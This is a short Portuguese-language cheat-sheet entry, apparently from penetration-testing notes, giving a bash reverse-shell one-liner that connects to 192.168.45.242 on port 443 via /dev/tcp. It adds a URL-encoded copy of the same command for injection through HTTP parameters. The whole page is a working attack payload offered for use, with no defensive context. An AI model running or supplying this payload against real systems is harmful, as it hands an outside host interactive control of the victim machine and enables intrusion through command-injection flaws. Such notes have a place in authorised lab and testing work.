---
title: "Reverse Shell (bash)"
---

# Reverse Shell (bash)

Reverse shell via `/dev/tcp` do bash, útil quando `nc` não está disponível. A versão URL-encoded é usada em injeções via parâmetros HTTP.

```shell
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.242/443 0>&1'

# URL encoded (para injeção em parâmetros HTTP)
%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E45%2E242%2F443%200%3E%261%27
```
